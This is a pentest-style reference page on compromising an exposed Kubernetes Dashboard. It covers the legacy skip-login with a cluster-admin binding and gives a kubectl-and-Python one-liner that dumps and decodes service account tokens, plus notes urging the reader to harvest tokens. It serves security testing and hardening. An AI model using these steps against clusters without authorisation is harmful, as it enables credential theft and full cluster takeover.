---
title: "Dashboard: cluster control through the web UI and its service account"
description: "The Kubernetes Dashboard acts with its own service account. Older deployments bound that account to cluster-admin and allowed skipping login, so a reachable dashboard gave full cluster control through the browser. Even current deployments are a target when exposed, since the dashboard's service account and any token entered into it drive the API server."
keywords:
  - kubernetes dashboard
  - kubernetes-dashboard
  - skip login
  - service account
  - cluster-admin
---

# Dashboard

The Kubernetes Dashboard is a web UI that talks to the API server using a service account. Its danger is historical and configurational: early deployments bound the `kubernetes-dashboard` service account to `cluster-admin` and allowed a Skip button at the login screen, so anyone who reached the dashboard operated as cluster admin with no credential. Current versions require a token and ship with minimal rights, but a reachable dashboard is still a target, because whatever token a user pastes into it, or the service account it runs as, becomes the attacker's access when the UI is exposed.

Find and assess it:

```bash
# the dashboard is a service, often exposed via NodePort or an ingress
curl -sk https://<node>:<nodeport>/ | grep -i dashboard
kubectl get svc -A | grep -i dashboard
# what can the dashboard's own service account do?
kubectl auth can-i --list --as=system:serviceaccount:kubernetes-dashboard:kubernetes-dashboard
```

## Routes

```bash
# legacy: a Skip-login dashboard bound to cluster-admin => full control in-browser
#   open the dashboard URL, click Skip, operate as cluster-admin.
# modern: steal or reuse a token that has dashboard access, or read the
#   dashboard SA token if its RBAC is broad
kubectl -n kubernetes-dashboard get secret -o json | \
  python3 -c 'import sys,json,base64;[print(base64.b64decode(s["data"].get("token","")).decode()[:60]) for s in json.load(sys.stdin)["items"] if "token" in s.get("data",{})]'
```

## Exploitation notes

- The first check is the dashboard service account's permissions; if it is bound to `cluster-admin` (the legacy default of some installs), reading or using its token is immediate full control.
- A Skip-login option on an exposed dashboard is an instant win; it drops you into the UI as the dashboard service account.
- When exposed via NodePort or ingress without authentication in front, the dashboard is reachable from outside the cluster; treat an exposed dashboard as a credential-handling surface and harvest any token it uses.

## References

- [Kubernetes Dashboard: access control](https://github.com/kubernetes/dashboard/blob/master/docs/user/access-control/README.md)
- [HackTricks: Kubernetes dashboard](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security)
